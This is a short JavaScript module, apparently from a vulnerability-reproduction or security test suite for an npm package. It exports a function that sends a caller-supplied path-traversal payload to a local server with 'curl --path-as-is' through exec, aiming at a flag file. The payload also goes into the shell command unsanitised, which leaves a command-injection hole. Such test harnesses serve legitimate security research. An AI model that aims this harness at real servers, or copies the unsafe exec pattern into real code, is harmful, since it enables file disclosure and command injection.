function exploitFunction(payload) {
  const pathToFlag = path.resolve(__dirname, "../flag.html");
  const server = "node ./node_modules/caolilinode1/caolili.js";

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;

  exec(attack_string, (error, stdout) => {
    if (error) {
      console.error(`Error: ${error}`);
      return;
    }
    return stdout;
  });
}

module.exports = { exploitFunction };